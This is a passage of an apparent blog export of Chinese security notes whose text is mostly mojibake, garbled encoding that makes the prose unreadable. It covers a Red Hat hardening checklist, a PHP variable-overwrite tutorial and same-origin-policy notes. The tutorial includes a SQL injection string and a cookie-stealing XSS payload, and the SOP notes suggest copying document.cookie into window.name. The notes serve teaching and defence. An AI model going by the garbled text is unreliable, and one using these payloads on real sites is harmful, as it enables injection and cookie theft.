#ä¸è®¾ç½®ä½¿ç”¨åŸºäºrhostsçš„å®‰å…¨éªŒè¯</span><br><span class="line">              RhostsRSAAuthentication no #ä¸è®¾ç½®ä½¿ç”¨RSAç®—æ³•çš„åŸºäºrhostsçš„å®‰å…¨éªŒè¯</span><br><span class="line">              HostbasedAuthentication no #ä¸å…è®¸åŸºäºä¸»æœºç™½åå•æ–¹å¼è®¤è¯</span><br><span class="line">              PermitRootLogin no #ä¸å…è®¸rootç™»å½•</span><br><span class="line">              PermitEmptyPasswords no #ä¸å…è®¸ç©ºå¯†ç </span><br><span class="line">              Banner /etc/motd  #è®¾ç½®sshç™»å½•æ—¶æ˜¾ç¤ºçš„banner</span><br><span class="line">          4ã€ä»¥ä¸Šæ¡ä»¶éƒ½æ»¡è¶³ä¸ºç¬¦åˆã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼š1ã€å‚è€ƒé…ç½®æ“ä½œ</span><br><span class="line">            ç¼–è¾‘ sshd_configï¼Œæ·»åŠ ç›¸å…³è®¾ç½®ï¼ŒSSHDç›¸å…³å®‰å…¨è®¾ç½®é€‰é¡¹å‚è€ƒæ£€æŸ¥æ–¹æ³•ä¸­çš„æè¿°ã€‚</span><br><span class="line">          2ã€è¡¥å……æ“ä½œè¯´æ˜</span><br><span class="line">            æŸ¥çœ‹SSHæœåŠ¡çŠ¶æ€ï¼š# ps â€“elf|grep ssh</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="åäºŒã€å…³é—­ä¸å¿…è¦çš„æœåŠ¡"><a href="#åäºŒã€å…³é—­ä¸å¿…è¦çš„æœåŠ¡" class="headerlink" title="åäºŒã€å…³é—­ä¸å¿…è¦çš„æœåŠ¡"></a>åäºŒã€å…³é—­ä¸å¿…è¦çš„æœåŠ¡</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šå…³é—­ä¸å¿…è¦çš„ç³»ç»ŸæœåŠ¡</span><br><span class="line">é…ç½®è¦æ±‚ï¼šæ ¹æ®æ¯å°æœºå™¨çš„ä¸åŒè§’è‰²ï¼Œå…³é—­ä¸éœ€è¦çš„ç³»ç»ŸæœåŠ¡ã€‚æ“ä½œæŒ‡å—ä¸­çš„æœåŠ¡é¡¹æä¾›å‚è€ƒï¼Œæ ¹æ®æœåŠ¡å™¨çš„è§’è‰²å’Œåº”ç”¨æƒ…å†µå¯¹å¯åŠ¨é¡¹è¿›è¡Œä¿®æ”¹ã€‚</span><br><span class="line">å¦‚æ— ç‰¹æ®Šéœ€è¦ï¼Œåº”å…³é—­Sendmailã€Telnetã€Bindç­‰æœåŠ¡ã€‚</span><br><span class="line">æ“ä½œæŒ‡å—ï¼šæ‰§è¡Œå‘½ä»¤ #chkconfig --listï¼ŒæŸ¥çœ‹å“ªäº›æœåŠ¡å¼€æ”¾ã€‚</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼šä¸ç®¡ç†å‘˜ç¡®è®¤æ— ç”¨æœåŠ¡å·²å…³é—­</span><br><span class="line">é…ç½®æ–¹æ³•ï¼š1ã€å‚è€ƒé…ç½®æ“ä½œ</span><br><span class="line">        ä½¿ç”¨å¦‚ä¸‹æ–¹å¼ç¦ç”¨ä¸å¿…è¦çš„æœåŠ¡</span><br><span class="line">        #service &lt;æœåŠ¡å&gt; stop</span><br><span class="line">        #chkconfig --level 35 off</span><br><span class="line">        2ã€å‚è€ƒè¯´æ˜</span><br><span class="line">        Linux/Unixç³»ç»ŸæœåŠ¡ä¸­ï¼Œéƒ¨åˆ†æœåŠ¡å­˜åœ¨è¾ƒé«˜å®‰å…¨é£é™©ï¼Œåº”å½“ç¦ç”¨ï¼ŒåŒ…æ‹¬ï¼š</span><br><span class="line">        â€œlpdâ€ï¼Œæ­¤æœåŠ¡ä¸ºè¡Œå¼æ‰“å°æœºåå°ç¨‹åºï¼Œç”¨äºå‡è„±æœºæ‰“å°å·¥ä½œçš„UNIXåå°ç¨‹åºï¼Œæ­¤æœåŠ¡é€šå¸¸æƒ…å†µä¸‹ä¸ç”¨ï¼Œå»ºè®®ç¦ç”¨ï¼›</span><br><span class="line">        â€œtelnetâ€ï¼Œæ­¤æœåŠ¡é‡‡ç”¨æ˜æ–‡ä¼ è¾“æ•°æ®ï¼Œç™»é™†ä¿¡æ¯å®¹æ˜“è¢«çªƒå–ï¼Œå»ºè®®ç”¨sshä»£æ›¿ï¼›</span><br><span class="line">        â€œroutedâ€ï¼Œæ­¤æœåŠ¡ä¸ºè·¯ç”±å®ˆå€™è¿›ç¨‹ï¼Œä½¿ç”¨åŠ¨æ€RIPè·¯ç”±é€‰æ‹©åè®®ï¼Œå»ºè®®ç¦ç”¨ï¼›</span><br><span class="line">        â€œsendmailâ€ï¼Œæ­¤æœåŠ¡ä¸ºé‚®ä»¶æœåŠ¡å®ˆæŠ¤è¿›ç¨‹ï¼Œéé‚®ä»¶æœåŠ¡å™¨åº”å°†å…¶å…³é—­ï¼›</span><br><span class="line">        â€œBluetoothâ€ï¼Œæ­¤æœåŠ¡ä¸ºè“ç‰™æœåŠ¡ï¼Œå¦‚æœä¸éœ€è¦è“ç‰™æœåŠ¡æ—¶åº”å…³é—­ï¼›</span><br><span class="line">        â€œidentdâ€ï¼Œæ­¤æœåŠ¡ä¸ºAUTHæœåŠ¡ï¼Œåœ¨æä¾›ç”¨æˆ·ä¿¡æ¯æ–¹é¢ä¸fingerç±»ä¼¼ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¯¥æœåŠ¡ä¸æ˜¯å¿…é¡»çš„ï¼Œå»ºè®®å…³é—­ï¼›</span><br><span class="line">        â€œxfsâ€ï¼Œæ­¤æœåŠ¡ä¸ºLinuxä¸­X Windowçš„å­—ä½“æœåŠ¡ï¼Œå…³äºè¯¥æœåŠ¡å†å²ä¸Šå‡ºç°è¿‡ä¿¡æ¯æ³„éœ²å’Œæ‹’ç»æœåŠ¡ç­‰æ¼æ´ï¼Œåº”ä»¥å‡å°‘ç³»ç»Ÿé£é™©ï¼›</span><br><span class="line">        RæœåŠ¡ï¼ˆâ€œrloginâ€ã€â€œrwhoâ€ã€â€œrshâ€ã€â€œrexecâ€ï¼‰ï¼ŒRæœåŠ¡è®¾è®¡ä¸Šå­˜åœ¨ä¸¥é‡çš„å®‰å…¨ç¼ºé™·ï¼Œä»…é€‚ç”¨äºå°é—­ç¯å¢ƒä¸­ä¿¡ä»»ä¸»æœºä¹‹é—´ä¾¿æ·è®¿é—®ï¼Œ</span><br><span class="line">        å…¶ä»–åœºåˆä¸‹å‡å¿…é¡»ç¦ç”¨ï¼›</span><br><span class="line">        åŸºäºinetd/xinetdçš„æœåŠ¡ï¼ˆdaytimeã€chargenã€echoç­‰ï¼‰ï¼Œæ­¤ç±»æœåŠ¡å»ºè®®ç¦ç”¨ã€‚</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3ã€Linux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="åä¸‰ã€ç¦æ­¢ctr-alt-delé”®ç›˜å…³é—­å‘½ä»¤"><a href="#åä¸‰ã€ç¦æ­¢ctr-alt-delé”®ç›˜å…³é—­å‘½ä»¤" class="headerlink" title="åä¸‰ã€ç¦æ­¢ctr+alt+delé”®ç›˜å…³é—­å‘½ä»¤"></a>åä¸‰ã€ç¦æ­¢ctr+alt+delé”®ç›˜å…³é—­å‘½ä»¤</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šç¦æ­¢Control-Alt-Deleteé”®ç›˜å…³é—­å‘½ä»¤</span><br><span class="line">é…ç½®è¦æ±‚ï¼šåº”ç¦æ­¢ä½¿ç”¨Control-Alt-Deleteç»„åˆé”®é‡å¯æœåŠ¡å™¨ï¼Œé˜²æ­¢è¯¯æ“ä½œ</span><br><span class="line">æ“ä½œæŒ‡å—ï¼šå‘½ä»¤cat /etc/inittabï¼ŒæŸ¥çœ‹é…ç½®</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼š/etc/inittab ä¸­åº”æœ‰ï¼šâ€œ#ca::ctrlaltdel:/sbin/shutdown -t3 -r nowâ€é…ç½®ä¸ºç¬¦åˆã€‚</span><br><span class="line">é…ç½®æ–¹æ³•ï¼š1ã€å‚è€ƒé…ç½®æ“ä½œ</span><br><span class="line">            åœ¨â€œ/etc/inittabâ€ æ–‡ä»¶ä¸­æ³¨é‡Šæ‰ä¸‹é¢è¿™è¡Œï¼ˆä½¿ç”¨#ï¼‰ï¼š ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            æ”¹ä¸ºï¼š #ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            ä¸ºäº†ä½¿æ­¤æ”¹åŠ¨ç”Ÿæ•ˆï¼Œè¾“å…¥ä¸‹é¢è¿™ä¸ªå‘½ä»¤ï¼š # /sbin/init q</span><br><span class="line">        2ã€è¡¥å……è¯´æ˜</span><br><span class="line">            ç¦æ­¢ctl-alt-delä½¿å¾—åœ¨æ§åˆ¶å°ç›´æ¥æŒ‰ctl-alt-delä¸èƒ½é‡æ–°å¯åŠ¨è®¡ç®—æœºã€‚</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 4</span><br></pre></td></tr></table></figure>

<h1 id="åå››ã€å®‰è£…æ“ä½œç³»ç»Ÿè¡¥ä¸"><a href="#åå››ã€å®‰è£…æ“ä½œç³»ç»Ÿè¡¥ä¸" class="headerlink" title="åå››ã€å®‰è£…æ“ä½œç³»ç»Ÿè¡¥ä¸"></a>åå››ã€å®‰è£…æ“ä½œç³»ç»Ÿè¡¥ä¸</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®åç§°ï¼šå®‰è£…æ“ä½œç³»ç»Ÿæ›´æ–°è¡¥ä¸</span><br><span class="line">é…ç½®è¦æ±‚ï¼šå®‰è£…æ“ä½œç³»ç»Ÿæ›´æ–°è¡¥ä¸ï¼Œä¿®å¤ç³»ç»Ÿæ¼æ´</span><br><span class="line">æ“ä½œæŒ‡å—ï¼š1ã€æŸ¥çœ‹å½“å‰ç³»ç»Ÿè¡¥ä¸ç‰ˆæœ¬</span><br><span class="line">          2ã€æ£€æŸ¥å®˜ç½‘å½“å‰ç³»ç»Ÿç‰ˆæœ¬æ˜¯å¦å‘å¸ƒå®‰å…¨æ›´æ–°ã€‚</span><br><span class="line">æ£€æŸ¥æ–¹æ³•ï¼šç‰ˆæœ¬åº”ä¿æŒä¸ºæœ€æ–°</span><br><span class="line">é…ç½®æ–¹æ³•ï¼šé€šè¿‡è®¿é—®</span><br><span class="line">https://rhn.redhat.com/errata/ä¸‹è½½è¡¥ä¸å®‰è£…åŒ…ï¼Œåœ¨æ‰“å¼€çš„é¡µé¢ä¸Šï¼Œé€‰æ‹©ä¸è‡ªå·±ä½¿ç”¨ç›¸å¯¹åº”çš„ç³»ç»Ÿåï¼Œç‚¹å‡»è¿æ¥è¿›å…¥è¡¥ä¸åŒ…ä¸‹è½½åˆ—è¡¨ç•Œé¢ï¼Œ</span><br><span class="line">é€‰æ‹©éœ€è¦çš„è¡¥ä¸ä¸‹è½½ã€‚</span><br><span class="line">         ä¸‹è½½çš„è¡¥ä¸ä¸ºrpmå®‰è£…åŒ…ï¼Œå°†è¯¥å®‰è£…åŒ…å¤åˆ¶åˆ°ç›®æ ‡ç³»ç»Ÿä¸Šï¼Œä½¿ç”¨å‘½ä»¤rpm â€“ivh xxx.rpmè¿›è¡Œå®‰è£…ï¼Œéšåé‡æ–°å¯åŠ¨ç³»ç»Ÿï¼Œ</span><br><span class="line">         æ£€æŸ¥æ‰€å®‰è£…è¡¥ä¸çš„æœåŠ¡æˆ–åº”ç”¨ç¨‹åºæ˜¯å¦è¿è¡Œæ­£å¸¸ï¼Œå³å®Œæˆè¯¥è¡¥ä¸çš„å®‰è£…å’Œå‡çº§å·¥ä½œã€‚</span><br><span class="line">é€‚ç”¨ç‰ˆæœ¬ï¼šLinux Redhat AS 3 Linux Redhat AS 4</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>å®‰å…¨åŸºçº¿</tag>
      </tags>
  </entry>
  <entry>
    <title>å˜é‡è¦†ç›–</title>
    <url>/archives/c6852300.html</url>
    <content><![CDATA[<h1 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h1><h2 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h2><p>ä½¿ç”¨è‡ªå®šä¹‰çš„å‚æ•°å€¼å»è¦†ç›–æ›¿æ¢ç¨‹åºåŸæœ‰çš„å˜é‡å€¼ã€‚</p>
<p>æ¶‰åŠå‡½æ•°ï¼šextract parse_str import_request_variablesâ€”â€”php5.4ç‰ˆæœ¬ä»¥ä¸Šå·²è¢«å¼ƒç”¨ $$</p>
<p><strong>extractå‡½æ•°</strong></p>
<p>è¯¥å‡½æ•°å°†ä¸€ä¸ªæ•°ç»„æ³¨å†Œæˆå˜é‡ï¼Œæ¯ä¸€å¯¹é”®å€¼å¯¹å¯¹åº”ä¸€ç»„å˜é‡ã€‚</p>
<p><code>int extract (array,options,prefix)</code></p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œä¸ºè¢«æ“ä½œé‡ï¼Œç¬¬äºŒä¸ªå‚æ•°é™å®šäº†å˜é‡æ³¨å†Œçš„è§„åˆ™ã€‚å½“ç¬¬äºŒä¸ªå‚æ•°ä¸º</p>
<p><a href="%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%2075f71fb7b52d48ac8f1fee5971481ad6/%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%20f6faafce79bd4e4483c243fcc670bbeb.csv">ç¬¬äºŒä¸ªå‚æ•°</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpecho &quot;&lt;meta http-equiv=&#x27;content-type&#x27; content=&#x27;text/html;charset=utf-8&#x27;&gt;&quot;;//extract$a=10;echo &#x27;è¦†ç›–å‰$aï¼š&#x27;.$a.&#x27;&lt;/br&gt;&#x27;;$o=array(&#x27;a&#x27;=&gt;20,&#x27;b&#x27;=&gt;30);extract($o);echo &#x27;è¦†ç›–å$aï¼š&#x27;.$a.&#x27;&lt;/br&gt;&#x27;;echo &#x27;æ–°æ³¨å†Œå˜é‡$bï¼š&#x27;.$b.&#x27;&lt;/br&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p><strong>parse_strå‡½æ•°</strong></p>
<p>è§£æå­—ç¬¦ä¸²æ³¨å†Œå˜é‡ï¼Œåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å®ƒæ˜¯å¦å·²ç»å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¦†ç›–åˆ°ä¹‹å‰çš„å˜é‡ã€‚</p>
<p><code>void parse_str(string,array)</code></p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦æ³¨å†Œçš„å­—ç¬¦ä¸²ï¼Œå½¢å¼ä¸º<code>a=1</code> ä¼šè¢«æ³¨å†Œä¸º<code>$a=1</code> ,å½“ç¬¬äºŒä¸ªå‚æ•°å­˜åœ¨çš„æ—¶å€™ï¼Œè¯¥å˜é‡ä¼šè¢«æ³¨å†Œä¸ºä¸€ä¸ªæ•°ç»„ã€‚å¦‚æœè¿™ä¸ªæ•°ç»„åŸæœ¬å°±å­˜åœ¨ç›¸åŒçš„é”®ï¼Œåˆ™ä¼šè¦†ç›–æ‰åŸæœ‰çš„é”®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//parse_str//æ³¨å†Œå˜é‡$d=111;echo &#x27;parse_strè¦†ç›–å‰$dï¼š&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;parse_str(&#x27;d=666&#x27;);echo &#x27;parse_strè¦†ç›–å$dï¼š&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;//æ³¨å†Œæ•°ç»„parse_str(&#x27;d=8888&#x27;,$g);echo &#x27;parse_stræ³¨å†Œæ•°ç»„è¦†ç›–å$dï¼š&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;var_dump(&#x27;parse_strè¦†ç›–å$gï¼š&#x27;.$g.&#x27;&lt;/br&gt;&#x27;);echo $g[&#x27;d&#x27;];</span><br></pre></td></tr></table></figure>

<p><strong>import_request_variableså‡½æ•°</strong></p>
<p>æŠ¥getã€postã€cookieä¸­çš„å‚æ•°æ³¨å†Œä¸ºå˜é‡ï¼Œç”¨åœ¨åœ¨register_globalsè¢«ç¦æ­¢çš„æ—¶å€™ï¼Œå› ä¸ºå­˜åœ¨å®‰å…¨é£é™©ï¼Œç°åœ¨å·²ç»ä¸å»ºè®®ä½¿ç”¨ã€‚</p>
<p><code>bool import_request_variables(types,prefix)</code></p>
<p>types GPC</p>
<p>prefix å‰ç¼€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$h=11;//import_request_variables(&#x27;GP&#x27;); //å·²å¯ç”¨echo $h;</span><br></pre></td></tr></table></figure>

<p><strong>$$å˜é‡è¦†ç›–</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php$a=10;echo $a;echo &#x27;&lt;/br&gt;&#x27;;foreach ($_POST as $key=&gt;$value)&#123;    $$key=$value;    echo $a;&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å˜é‡è¦†ç›–ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¦†ç›–æ‰€æœ‰ä¹‹å‰çš„å˜é‡ï¼Œæ¯”å¦‚è¯´å­˜åœ¨ä¸€å¤©sqlè¯­å¥è¿™ä¹ˆå†™çš„</p>
<p><code>select * from &#123;$test&#125; where name=&#39;armandhe&#39;</code></p>
<p>é‚£ä¹ˆå¯ä»¥è¦†ç›–$testï¼Œä¼ å…¥</p>
<p><code>?test=mysql.user limit 1%23</code></p>
<p>è¿™æ ·å°±å½¢æˆäº†sqlæ³¨å…¥</p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥æ³¨å…¥xss</p>
<p>å¦‚æœåå°å­˜åœ¨</p>
<p><code>echo $a</code></p>
<p>è¦†ç›–</p>
<p><code>?a=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><blockquote>
<p>ä½¿ç”¨åŸå§‹å˜é‡ï¼Œ$_GETç­‰ï¼Œä¸è¦ç©èŠ±çš„ã€‚</p>
</blockquote>
<blockquote>
<p>æ³¨å†Œå˜é‡å‰ï¼Œå…ˆéªŒè¯å˜é‡æ˜¯å¦å­˜åœ¨ã€‚</p>
</blockquote>
<blockquote>
<p>åŒä¸€åŠ å‰ç¼€</p>
</blockquote>
<blockquote>
<p>è‡ªè¡Œå®šä¹‰çš„å˜é‡ä¸€å®šè¦è®°ä½åˆå§‹åŒ–ï¼Œ ä¸ç„¶å³ä¾¿æ³¨å†Œå˜é‡çš„ä»£ç åœ¨æœ€å‰é¢ä¹Ÿä¼šè¦†ç›–è¿™äº›æœªåˆå§‹åŒ–çš„å˜é‡ã€‚</p>
</blockquote>
<p>å…³é—­ register_globals</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
        <tag>PHP</tag>
        <tag>å˜é‡è¦†ç›–</tag>
      </tags>
  </entry>
  <entry>
    <title>åŒæºç­–ç•¥â€”â€”â€”SOP</title>
    <url>/archives/446c8683.html</url>
    <content><![CDATA[<h1 id="åŒæºç­–ç•¥â€”â€”â€”SOP"><a href="#åŒæºç­–ç•¥â€”â€”â€”SOP" class="headerlink" title="åŒæºç­–ç•¥â€”â€”â€”SOP"></a>åŒæºç­–ç•¥â€”â€”â€”SOP</h1><p>è¯¥ç¬”è®°å‚è€ƒä»¥ä¸‹æ–‡ç« </p>
<p><a href="https://www.jianshu.com/p/beb059c43a8b">å‰ç«¯å¿…å¤‡HTTPæŠ€èƒ½ä¹‹åŒæºç­–ç•¥è¯¦è§£</a></p>
<h1 id="åŒæºç­–ç•¥æ¦‚è¿°"><a href="#åŒæºç­–ç•¥æ¦‚è¿°" class="headerlink" title="åŒæºç­–ç•¥æ¦‚è¿°"></a>åŒæºç­–ç•¥æ¦‚è¿°</h1><p>åŒæºç­–ç•¥è§„å®šäº†ä¸¤ä¸ªé¡µé¢ä¹‹é—´äº’ç›¸è®¿é—®æ•°æ®çš„è§„åˆ™ã€‚å³åªæœ‰åœ¨åŒä¸€ä¸ªæºä¸‹çš„é¡µé¢æ‰èƒ½äº’ç›¸è®¿é—®å½¼æ­¤çš„é¡µé¢æ•°æ®ã€‚è¯¥æœºåˆ¶å¯ä»¥é˜»æ­¢æŸä¸ªé¡µé¢ä¸­çš„æ¶æ„è„šæœ¬å¯¹å…¶ä»–é¡µé¢çš„æ•æ„Ÿä¿¡æ¯çš„è®¿é—®ã€‚</p>
<p>åŒæºç­–ç•¥å¯¹äºä½¿ç”¨cookieä¿å­˜sessionä¿¡æ¯æ¥å®ç°èº«ä»½è®¤è¯çš„æµè§ˆå™¨æ¥è¯´å…·æœ‰é‡å¤§æ„ä¹‰</p>
<p>æºæ˜¯é€šè¿‡<code>åè®®ã€ä¸»æœºã€ç«¯å£</code>æ¥å®šä¹‰çš„ï¼Œåªæœ‰è¿™ä¸‰è€…ä¿æŒä¸€è‡´çš„æ—¶å€™çŒœè¢«è®¤ä¸ºæ˜¯åŒæºçš„ï¼Œä¸åŒæºçš„é¡µé¢ä¹‹é—´æ˜¯ä¸èƒ½äº’ç›¸è®¿é—®çš„</p>
<h1 id="å¦‚ä½•è§„é¿åŒæºç­–ç•¥â€”-è·¨åŸŸé€šä¿¡æ‰‹æ®µ"><a href="#å¦‚ä½•è§„é¿åŒæºç­–ç•¥â€”-è·¨åŸŸé€šä¿¡æ‰‹æ®µ" class="headerlink" title="å¦‚ä½•è§„é¿åŒæºç­–ç•¥â€”-è·¨åŸŸé€šä¿¡æ‰‹æ®µ"></a>å¦‚ä½•è§„é¿åŒæºç­–ç•¥â€”-è·¨åŸŸé€šä¿¡æ‰‹æ®µ</h1><p><a href="http://codercto.com/a/29007.html">æµ…è°ˆsopã€corså’Œcsp</a></p>
<p>æˆ‘ä»¬çš„ç½‘ç«™å¦‚æœæœ‰ä¸¤ä¸ªä¸»æœºï¼Œé‚£ä¹ˆå› ä¸ºåŒæºç­–ç•¥çš„é™åˆ¶ä»–ä»¬ä¹‹é—´å°±ä¸èƒ½äº’ç›¸äº¤æ¢æ•°æ®ï¼Œè¿™æ˜æ˜¾æ˜¯ä¸ç¬¦åˆè¦æ±‚çš„ï¼Œé‚£ä¹ˆæ€ä¹ˆè§„é¿æ‰åŒæºç­–ç•¥å‘¢</p>
<h2 id="ä½¿ç”¨document-domain"><a href="#ä½¿ç”¨document-domain" class="headerlink" title="ä½¿ç”¨document.domain"></a>ä½¿ç”¨document.domain</h2><p>å°†ä¸¤ä¸ªä¸»æœºçš„æºè®¾ç½®ä¸ºåŒä¸€ä¸ªï¼Œæ­¤æ—¶ä»–ä»¬ä¹‹é—´å°±å¯ä»¥äº’ç›¸è®¿é—®èµ„æºäº†</p>
<p>è¿™ä¸ªæ–¹æ³•æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œæˆ‘ä»¬åœ¨ä¿®æ”¹æºçš„æ—¶å€™ï¼Œå¯èƒ½æŠŠç«¯å£å·ä¿®æ”¹ä¸ºnullï¼Œæ­¤æ—¶ä¸¤ä¸ªç½‘ç«™å°±ä¸åŒæºäº†ã€‚åªæœ‰cookieå’Œiframeå…±äº«å¯é€šè¿‡è¯¥æ–¹å¼è®¾ç½®ï¼Œä¸èƒ½å…±äº«localstorageå’Œindexdb</p>
<h2 id="ä½¿ç”¨window-name"><a href="#ä½¿ç”¨window-name" class="headerlink" title="ä½¿ç”¨window.name"></a>ä½¿ç”¨window.name</h2><p>window.nameä¸­çš„å€¼ä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ³¨å…¥çš„è¯­å¥ä¸­å°†æˆ‘ä»¬æƒ³è¦çš„æ•°æ®èµ‹å€¼ç»™window.nameï¼Œç„¶åå†è·å–ï¼Œå¦‚ï¼š</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span>=<span class="variable language_">document</span>.<span class="property">cookie</span> #è¿™æ ·å°±å¯ä»¥ç»•è¿‡åŒæºç­–ç•¥è·å–å½“å‰é¡µé¢çš„cookie</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸€ä¸ªçª—å£(window)çš„ç”Ÿå‘½å‘¨æœŸå†…,çª—å£è½½å…¥çš„æ‰€æœ‰çš„é¡µé¢éƒ½æ˜¯å…±äº«ä¸€ä¸ªwindow.nameçš„ï¼Œæ¯ä¸ªé¡µé¢å¯¹window.nameéƒ½æœ‰è¯»å†™çš„æƒé™ï¼Œwindow.nameæ˜¯æŒä¹…å­˜åœ¨ä¸€ä¸ªçª—å£è½½å…¥è¿‡çš„æ‰€æœ‰é¡µé¢ä¸­çš„ï¼Œå¹¶ä¸ä¼šå› æ–°é¡µé¢çš„è½½å…¥è€Œè¿›è¡Œé‡ç½®ã€‚è¿™ä¸ªå±æ€§çš„æœ€å¤§ç‰¹ç‚¹æ˜¯ï¼Œæ— è®ºæ˜¯å¦åŒæºï¼Œåªè¦åœ¨åŒä¸€ä¸ªçª—å£é‡Œï¼Œå‰ä¸€ä¸ªç½‘é¡µè®¾ç½®äº†è¿™ä¸ªå±æ€§ï¼Œåä¸€ä¸ªç½‘é¡µå¯ä»¥è¯»å–å®ƒã€‚</p>
<h2 id="CORS-è·¨åŸŸèµ„æºè®¿é—®"><a href="#CORS-è·¨åŸŸèµ„æºè®¿é—®" class="headerlink" title="CORS è·¨åŸŸèµ„æºè®¿é—®"></a>CORS è·¨åŸŸèµ„æºè®¿é—®</h2><p>å…è®¸æµè§ˆå™¨å‘è·¨æº<a href="http://www.codercto.com/category/server.html">æœåŠ¡å™¨</a>å‘XMLHttpRequestè¯·æ±‚ï¼Œçªç ´äº†ajaxåªèƒ½åŒæºçš„é™åˆ¶ï¼Œå¹¶ä¸”å’Œajaxä»£ç ä¸€æ ·ï¼Œå…³é”®åœ¨æœåŠ¡å™¨çš„corsé…ç½®ã€‚è¯¥ç­–ç•¥é™åˆ¶çš„æ˜¯æµè§ˆå™¨å¯¹ç›®çš„åœ°å€çš„è¯»å–ï¼Œå³åœ¨æµè§ˆå™¨å‘å‡ºè¯·æ±‚åï¼Œç›®çš„åœ°å€çš„èµ„æºå·²ç»æˆåŠŸè¢«æµè§ˆå™¨åŠ è½½äº†ï¼Œä½†æ˜¯å› ä¸ºcorsçš„å­˜åœ¨æ‰€ä»¥æµè§ˆå™¨ä¼šåˆ¤æ–­ä¸‹åˆ—å­—æ®µï¼Œç¡®å®šå‘å‡ºè¯·æ±‚çš„ç½‘é¡µæ˜¯å¦æœ‰åŠ è½½è¯¥èµ„æºçš„æƒé™ã€‚</p>
<p>**Access-control-allow-originï¼š**è®¾ç½®å“ªå†™æºçš„ç½‘é¡µå¯ä»¥è®¿é—®æœ¬ç½‘é¡µçš„èµ„æº</p>
<p><strong>Access-Control-ALlow-Method:å…è®¸çš„è¯·æ±‚æ–¹æ³•</strong></p>
<p><strong>Access-Control-Expose-Headers:æ—¶å€™å…è®¸è¿”å›è‡ªå®šä¹‰çš„heepå¤´å­—æ®µ</strong></p>
<p><strong>Access-Control-Allow-Credentials:æ˜¯å¦å…è®¸å‘cookie</strong></p>
<p><strong>corsåˆ†ä¸ºç®€å•è¯·æ±‚ä¸éç®€å•è¯·æ±‚</strong></p>
<p>ç®€å•è¯·æ±‚</p>
<p>æ–¹æ³•ï¼šhead\get\post</p>
<p>httpå¤´ï¼šacaoå¿…é€‰ aceh acacå¯é€‰</p>
<p>éç®€å•è¯·æ±‚</p>
<p>å…ˆè¿›è¡Œé¢„æ£€è¯·æ±‚options</p>
<p>httpå¤´ï¼šacao acae å¿…é€‰ acrhå¯é€‰</p>
